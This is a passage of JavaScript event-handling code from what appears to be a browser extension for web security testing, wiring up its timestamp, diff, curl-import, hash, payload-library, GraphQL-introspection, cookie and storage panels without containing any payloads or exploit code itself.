    $('ts-input').value = Math.floor(Date.now() / 1000);
    Timestamp.render(new Date());
  });
  $('ts-input').addEventListener('keydown', e => {
    if (e.key === 'Enter') Timestamp.render(Timestamp.parse($('ts-input').value));
  });
  $('ts-output').addEventListener('click', e => {
    const btn = e.target.closest('.ts-copy-btn');
    if (!btn) return;
    copyText(btn.dataset.val);
    toast('Copied', 'success');
  });

  // ── Diff ──
  $('diff-btn').addEventListener('click', () => Diff.run());
  $('diff-clear-btn').addEventListener('click', () => Diff.clear());

  // ── Curl import ──
  $('dispatch-import-curl').addEventListener('click', () => {
    $('curl-import-panel').classList.toggle('hidden');
  });
  $('curl-import-cancel').addEventListener('click', () => {
    $('curl-import-panel').classList.add('hidden');
    $('curl-import-input').value = '';
  });
  $('curl-import-load').addEventListener('click', () => {
    const raw = $('curl-import-input').value.trim();
    if (!raw) return;
    try {
      const { method, url, headers, body } = parseCurlCommand(raw);
      if (url) $('dispatch-url').value = url;
      if (method) $('dispatch-method').value = method;
      $('dispatch-headers').value = Object.entries(headers).map(([k, v]) => `${k}: ${v}`).join('\n');
      $('dispatch-body').value = body || '';
      if (body) {
        $$('#tab-dispatch .dispatch-tab-btn').forEach(b => b.classList.remove('active'));
        document.querySelector('#tab-dispatch .dispatch-tab-btn[data-pane="body"]')?.classList.add('active');
        $('dispatch-headers').classList.add('hidden');
        $('dispatch-body').classList.remove('hidden');
      }
      $('curl-import-panel').classList.add('hidden');
      $('curl-import-input').value = '';
      toast('curl loaded', 'success');
    } catch (e) {
      toast(`Parse error: ${e.message}`, 'error');
    }
  });

  $('hash-btn').addEventListener('click', async () => {
    const type  = $('hash-type').value;
    const input = $('hash-input').value;
    if (!input) return;
    const out = $('hash-output');
    if (type === 'identify') {
      const candidates = identifyHash(input);
      out.innerHTML = `<div class="hash-candidate">Input: <span class="hash-result-val">${esc(input)}</span></div>`
        + candidates.map(c => `<div class="hash-result-type">${esc(c)}</div>`).join('');
    } else {
      try {
        const hash = await hashString(type, input);
        out.innerHTML = `<div class="hash-result-type">${type.toUpperCase()}</div><div class="hash-result-val">${hash}</div>`;
      } catch (e) { toast(String(e), 'error'); }
    }
  });

  // ── Section jump links ──
  $$('.section-jump').forEach(a => a.addEventListener('click', e => {
    e.preventDefault();
    document.getElementById(a.dataset.target)?.scrollIntoView({ behavior: 'smooth', block: 'start' });
  }));

  // ── Payloads ──
  await Payloads.loadCustom();
  document.querySelector('.nav-btn[data-tab="payloads"]').addEventListener('click', () => Payloads.render());
  $('payload-search').addEventListener('input', e => { Payloads.filter = e.target.value; Payloads.render(); });
  $('payload-search-clear').addEventListener('click', () => { $('payload-search').value = ''; Payloads.filter = ''; Payloads.render(); });
  $('payload-custom-save').addEventListener('click', () => Payloads.saveCustom());
  $('payload-custom-list').addEventListener('click', e => {
    const edit = e.target.closest('[data-action="payload-edit-custom"]');
    if (edit) {
      const group = state.customPayloadCats.find(c => c.id === +edit.dataset.id);
      if (group) {
        $('payload-custom-name').value = group.cat;
        $('payload-custom-values').value = group.payloads.join('\n');
        document.querySelector('.payload-custom-editor')?.scrollIntoView({ behavior: 'smooth', block: 'start' });
      }
      return;
    }
    const del = e.target.closest('[data-action="payload-delete-custom"]');
    if (del) Payloads.deleteCustom(+del.dataset.id);
  });
  $('payload-output').addEventListener('click', e => {
	    const copyAll = e.target.closest('.payload-copy-all');
	    if (copyAll) {
	      const cat = Payloads.allCats()[parseInt(copyAll.dataset.idx)];
	      if (cat) {
	        const rows = Payloads.orderedRows(cat.cat, [
	          ...(cat.payloads || []).map(value => ({ value })),
	          ...(cat.customPayloads || []).map(value => ({ value })),
	        ]);
	        copyText(rows.map(r => Payloads.displayValue(cat.cat, r.value)).join('\n'));
	        toast('Copied all', 'success');
	      }
	      return;
	    }
	    const gqlMethod = e.target.closest('[data-action="payload-graphql-method"]');
	    if (gqlMethod) {
	      state.payloadGraphQLMethod = gqlMethod.dataset.method === 'GET' ? 'GET' : 'POST';
	      Payloads.render();
	      return;
	    }
    const addPayload = e.target.closest('.payload-add-btn');
    if (addPayload) {
      const wrap = addPayload.closest('.payload-add-row');
      const input = wrap?.querySelector('.payload-add-input');
      Payloads.addToGroup(addPayload.dataset.cat, input?.value || '');
      return;
    }
    const deleteOne = e.target.closest('.payload-delete-one');
    if (deleteOne) { Payloads.deletePayload(deleteOne.dataset.cat, +deleteOne.dataset.customIdx); return; }
    const copyOne = e.target.closest('.payload-copy-one');
    if (copyOne) { copyText(copyOne.dataset.val); toast('Copied', 'success'); return; }
    const copyUrlEncoded = e.target.closest('.payload-copy-urlencoded');
    if (copyUrlEncoded) { copyText(encodeURIComponent(copyUrlEncoded.dataset.val)); toast('Copied URL encoded', 'success'); return; }
    const sendEncode = e.target.closest('.payload-send-encode');
    if (sendEncode) {
      activateTab('tools');
      $('encode-input').value = sendEncode.dataset.val;
      $('encode-output').value = '';
      document.getElementById('tools-encode')?.scrollIntoView({ behavior: 'smooth', block: 'start' });
      toast('Payload sent to Encode / Decode', 'success');
      return;
    }
  });
  $('payload-output').addEventListener('keydown', e => {
    if (e.key !== 'Enter') return;
    const input = e.target.closest('.payload-add-input');
    if (!input) return;
    e.preventDefault();
    Payloads.addToGroup(input.dataset.cat, input.value);
  });
  $('payload-output').addEventListener('dragstart', e => {
    const row = e.target.closest('.payload-row');
    if (!row) return;
    row.classList.add('dragging');
    e.dataTransfer.effectAllowed = 'move';
    e.dataTransfer.setData('application/x-spectre-payload', JSON.stringify({
      cat: row.dataset.cat,
      value: row.dataset.val,
    }));
  });
  $('payload-output').addEventListener('dragend', e => {
    e.target.closest('.payload-row')?.classList.remove('dragging');
    $$('.payload-row.drag-over').forEach(row => row.classList.remove('drag-over'));
  });
  $('payload-output').addEventListener('dragover', e => {
    const row = e.target.closest('.payload-row');
    if (!row) return;
    e.preventDefault();
    e.dataTransfer.dropEffect = 'move';
    $$('.payload-row.drag-over').forEach(el => { if (el !== row) el.classList.remove('drag-over'); });
    row.classList.add('drag-over');
  });
  $('payload-output').addEventListener('dragleave', e => {
    e.target.closest('.payload-row')?.classList.remove('drag-over');
  });
  $('payload-output').addEventListener('drop', e => {
    const target = e.target.closest('.payload-row');
    if (!target) return;
    e.preventDefault();
    target.classList.remove('drag-over');
    let dragged = null;
    try { dragged = JSON.parse(e.dataTransfer.getData('application/x-spectre-payload')); } catch {}
    if (!dragged || dragged.cat !== target.dataset.cat) return;
    Payloads.reorderPayload(target.dataset.cat, dragged.value, target.dataset.val);
  });

  // ── GraphQL ──
  document.querySelector('.nav-btn[data-tab="graphql"]').addEventListener('click', () => {});
  $('graphql-detect').addEventListener('click', () => GraphQL.detect());
  $('graphql-introspect').addEventListener('click', () => GraphQL.introspect());
  $('graphql-clear').addEventListener('click', () => GraphQL.clear());
  $('graphql-schema-search').addEventListener('input', e => GraphQL.applySchemaSearch(e.target.value));
  $('graphql-schema-search-clear').addEventListener('click', () => {
    $('graphql-schema-search').value = '';
    GraphQL.applySchemaSearch('');
  });
  GraphQL.loadGqlUrlHistory();
  $('graphql-output').addEventListener('click', e => {
    const pick = e.target.closest('[data-action="graphql-pick"]');
    if (pick) {
      const urlInput = $('graphql-url');
      if (urlInput) urlInput.value = pick.dataset.url;
      return;
    }
    const toggleHdr = e.target.closest('[data-action="graphql-toggle"]');
    if (toggleHdr) { toggleHdr.closest('.graphql-section')?.classList.toggle('collapsed'); return; }
    const toDispatch = e.target.closest('[data-action="gql-to-dispatch"]');
    if (toDispatch) {
      const url = GraphQL.getCurrentUrl();
      const body = JSON.stringify({ query: '{\n  \n}' }, null, 2);
      GraphQL.sendToDispatch(url, body);
      return;
    }
    const fieldDispatch = e.target.closest('[data-action="gql-field-dispatch"]');
    if (fieldDispatch) {
      GraphQL.sendToDispatch(GraphQL.getCurrentUrl(), fieldDispatch.dataset.body);
      return;
    }
    const bypassBtn = e.target.closest('.gql-bypass-btn');
    if (bypassBtn) {
      const technique = bypassBtn.dataset.bypass;
      if (technique === 'get') {
        $('graphql-method').value = 'GET';
        GraphQL.introspect({ statusLabel: 'Trying GET bypass…' });
      } else {
        GraphQL.introspect({ ...GraphQL.getBypasses()[technique], statusLabel: `Trying ${GraphQL.getBypasses()[technique].label}…` });
      }
      return;
    }
  });

  // ── Bootstrap ──
  const activeTab = await getActiveTab();
  state.tabId  = activeTab.id;
  state.tabUrl = activeTab.url ?? '';
  Storage.switchView('local');
  Cookies.load();
  Auth.loadRoles();
  ActiveBar.update();
  Storage.load();

  // ── Sidebar collapse toggle ──
  const sidebar = $('sidebar');
  const toggleBtn = $('sidebar-toggle');
  const { sidebarCollapsed = false } = await chrome.storage.local.get('sidebarCollapsed');
  if (sidebarCollapsed) {
    sidebar.classList.add('collapsed');
    toggleBtn.textContent = 'Show';
    toggleBtn.title = 'Expand sidebar';
    toggleBtn.setAttribute('aria-label', 'Expand sidebar');
  }
  toggleBtn.addEventListener('click', async () => {
    const collapsed = sidebar.classList.toggle('collapsed');
    toggleBtn.textContent = collapsed ? 'Show' : 'Hide';
    toggleBtn.title = collapsed ? 'Expand sidebar' : 'Collapse sidebar';
    toggleBtn.setAttribute('aria-label', collapsed ? 'Expand sidebar' : 'Collapse sidebar');
    await chrome.storage.local.set({ sidebarCollapsed: collapsed });
  });

  // ── Active bar chip click → go to Profiles tab + section (#11) ──
  $('active-bar').addEventListener('click', e => {
    const chip = e.target.closest('.abar-chip');
    if (!chip) return;
    const sectionId = chip.dataset.section;
    // Mirror the normal tab-click logic exactly
    $$('.nav-btn').forEach(b => b.classList.remove('active'));
    $$('.tab-pane').forEach(p => { p.classList.remove('active'); p.classList.add('hidden'); });
    const tabBtn = document.querySelector('.nav-btn[data-tab="profiles"]');
    const tabPanel = $('tab-profiles');
    if (tabBtn) tabBtn.classList.add('active');
    if (tabPanel) { tabPanel.classList.remove('hidden'); tabPanel.classList.add('active'); }
    // Scroll to section with offset for sticky bars (rAF so layout updates first)
    if (sectionId) {
      const anchor = $(sectionId);
      if (anchor) {
        requestAnimationFrame(() => {
          const content = $('content');
          const stickyOffset = ($('active-bar').offsetHeight || 0) + 8;
          const top = anchor.getBoundingClientRect().top + content.scrollTop - stickyOffset;
          content.scrollTo({ top, behavior: 'smooth' });
        });
      }
    }
  });

  // ── Navigation refresh ──
  async function refreshForNav(url) {
    const tab = await getActiveTab();
    state.tabId  = tab?.id ?? state.tabId;
    state.tabUrl = url ?? tab?.url ?? state.tabUrl;
    Cookies.load();
    await Storage.load();
    Storage.switchView(state.storageView);
  }

  if (typeof chrome.devtools !== 'undefined' && chrome.devtools.network) {
    chrome.devtools.network.onNavigated.addListener(refreshForNav);
  } else {
    chrome.tabs.onUpdated.addListener((tabId, info) => {
      if (tabId === state.tabId && info.status === 'complete') {
        refreshForNav(info.url ?? state.tabUrl);
      }
    });
    chrome.tabs.onActivated.addListener(async ({ tabId }) => {
      const tab = await chrome.tabs.get(tabId).catch(() => null);
      if (tab) {
        state.tabId = tab.id;
        state.tabUrl = tab.url ?? '';
        Cookies.load();
        await Storage.load();
        Storage.switchView(state.storageView);
      }
    });
  }

  // ── Auto-refresh cookies on Set-Cookie (covers XHR/fetch login flows) ──
  let _cookieTimer = null;
  chrome.cookies.onChanged.addListener(() => {
    if (!isHttpUrl(state.tabUrl)) return;
    clearTimeout(_cookieTimer);
    _cookieTimer = setTimeout(() => Cookies.load(), 250);
  });
});
